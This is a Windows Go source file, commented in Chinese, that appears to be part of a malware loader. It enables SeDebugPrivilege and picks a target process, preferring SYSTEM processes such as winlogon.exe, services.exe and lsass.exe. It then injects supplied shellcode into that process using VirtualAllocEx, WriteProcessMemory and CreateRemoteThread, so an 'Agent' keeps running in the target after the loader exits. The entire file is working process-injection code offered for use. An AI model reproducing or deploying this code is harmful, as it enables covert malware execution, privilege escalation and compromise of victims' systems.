//go:build windows
// +build windows

package inject

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	ntdll              = syscall.NewLazyDLL("ntdll.dll")
	VirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	RtlMoveMemory      = ntdll.NewProc("RtlMoveMemory")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	PROCESS_ALL_ACCESS     = 0x1F0FFF
)

// Execute 将 Shellcode 注入到目标进程并执行
func Execute(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode 为空")
	}

	fmt.Printf("[+] 载荷已就绪: %d 字节\n", len(shellcode))

	// 0. 提升进程权限，启用 SeDebugPrivilege（关键：允许注入 SYSTEM 进程）
	if err := enableSeDebugPrivilege(); err != nil {
		fmt.Printf("[-] 警告：无法启用调试权限: %v\n", err)
		fmt.Println("[*] 将只能注入用户级进程")
	} else {
		fmt.Println("[+] SeDebugPrivilege 已启用，可注入 SYSTEM 进程")
	}

	// 1. 选择目标进程
	targetPID, targetName := findTargetProcess()
	if targetPID == 0 {
		return fmt.Errorf("未找到合适的注入目标")
	}
	fmt.Printf("[+] 选择注入目标: %s (PID: %d)\n", targetName, targetPID)

	// 验证目标进程的权限级别
	privilegeLevel := getProcessPrivilegeLevel(targetPID)
	fmt.Printf("[+] 目标进程权限级别: %s\n", privilegeLevel)

	// 2. 打开目标进程
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, targetPID)
	if err != nil {
		return fmt.Errorf("无法打开目标进程: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	fmt.Println("[+] 目标进程已打开")

	// 3. 在目标进程中申请内存
	addr, _, err := VirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("目标进程内存申请失败: %v", err)
	}
	fmt.Printf("[+] 目标进程内存申请成功: 0x%x\n", addr)

	// 4. 写入 Shellcode 到目标进程
	var written uintptr
	ret, _, err := WriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("写入目标进程内存失败: %v", err)
	}
	fmt.Printf("[+] Payload 已写入目标进程: %d 字节\n", written)

	// 5. 在目标进程创建远程线程执行
	thread, _, err := CreateRemoteThread.Call(
		uintptr(hProcess),
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		return fmt.Errorf("远程线程创建失败: %v", err)
	}
	fmt.Printf("[+] 远程线程已创建，Agent 已注入到 %s\n", targetName)
	fmt.Println("[+] Loader 任务完成，即将退出...")

	// 不等待线程执行，让 Loader 直接退出
	// Agent 会在目标进程中持续运行
	return nil
}

// findTargetProcess 寻找合适的注入目标进程
func findTargetProcess() (uint32, string) {
	// 优先级列表：优先选择高权限进程
	targets := []string{
		// SYSTEM 权限进程（如果 Loader 有足够权限）
		"winlogon.exe", // 登录进程，SYSTEM 权限
		"services.exe", // 服务控制管理器，SYSTEM 权限
		"lsass.exe",    // 本地安全权限服务，SYSTEM 权限

		// 次选：稳定的用户进程
		"explorer.exe",      // 资源管理器，用户管理员权限
		"svchost.exe",       // 系统服务，权限不定
		"dllhost.exe",       // COM 代理进程
		"RuntimeBroker.exe", // Win10+ 运行时代理
	}

	fmt.Println("[*] 扫描可注入进程...")
	for _, target := range targets {
		pid := findProcessByName(target)
		if pid != 0 {
			// 尝试打开进程验证是否有权限注入
			if canInject(pid) {
				fmt.Printf("[+] 找到可注入进程: %s (PID: %d)\n", target, pid)
				return pid, target
			} else {
				fmt.Printf("[-] 跳过: %s (PID: %d) - 权限不足\n", target, pid)
			}
		}
	}

	return 0, ""
}

// canInject 检查是否有权限注入到目标进程
func canInject(pid uint32) bool {
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return false
	}
	windows.CloseHandle(hProcess)
	return true
}

// findProcessByName 通过进程名查找 PID
func findProcessByName(name string) uint32 {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	if err := windows.Process32First(snapshot, &entry); err != nil {
		return 0
	}

	for {
		processName := windows.UTF16ToString(entry.ExeFile[:])
		if processName == name {
			return entry.ProcessID
		}

		if err := windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}

	return 0
}

// enableSeDebugPrivilege 启用 SeDebugPrivilege 特权
// 这允许进程打开和操作 SYSTEM 权限的进程（如 winlogon.exe, lsass.exe）
func enableSeDebugPrivilege() error {
	var token windows.Token

	// 打开当前进程的访问令牌
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("failed to open process token: %v", err)
	}
	defer token.Close()

	// 查找 SeDebugPrivilege 的 LUID
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("failed to lookup privilege: %v", err)
	}

	// 构造特权结构
	privileges := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	// 调整令牌特权
	err = windows.AdjustTokenPrivileges(token, false, &privileges, 0, nil, nil)
	if err != nil {
		return fmt.Errorf("failed to adjust token privileges: %v", err)
	}

	return nil
}

// getProcessPrivilegeLevel 获取进程的权限级别
func getProcessPrivilegeLevel(pid uint32) string {
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return "Unknown (无法查询)"
	}
	defer windows.CloseHandle(hProcess)

	var token windows.Token
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &token)
	if err != nil {
		return "Unknown (无法获取令牌)"
	}
	defer token.Close()

	// 获取令牌的用户 SID
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return "Unknown (无法获取用户)"
	}

	// 检查是否是 SYSTEM 用户
	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err == nil && tokenUser.User.Sid.Equals(systemSid) {
		return "SYSTEM (最高权限)"
	}

	// 检查是否是管理员组成员
	adminSid, err := windows.CreateWellKnownSid(windows.WinBuiltinAdministratorsSid)
	if err == nil {
		isMember, err := token.IsMember(adminSid)
		if err == nil && isMember {
			return "Administrator (管理员)"
		}
	}

	return "User (普通用户)"
}
